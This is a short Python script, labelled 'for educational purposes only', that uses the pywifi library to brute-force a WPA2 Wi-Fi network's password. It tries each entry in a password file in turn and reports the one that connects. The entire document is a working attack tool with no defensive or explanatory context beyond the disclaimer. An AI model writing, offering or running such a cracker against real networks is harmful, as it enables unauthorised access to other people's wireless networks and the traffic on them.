# FOR EDUCATIONAL PURPOSES ONLY

import pywifi
from pywifi import const
import time

def test_password(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    iface.disconnect()
    time.sleep(0.3)
    
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    
    iface.connect(tmp_profile)
    time.sleep(0.5)
    
    if iface.status() == const.IFACE_CONNECTED:
        return True
    return False

# using:
ssid = input("Wi-Fi name: ")
with open("passwords.txt", "r") as f:
    for pwd in f:
        pwd = pwd.strip()
        print(f"try: {pwd}")
        if test_password(ssid, pwd):
            print(f"correct password: {pwd}")
            break
        time.sleep(0.2)

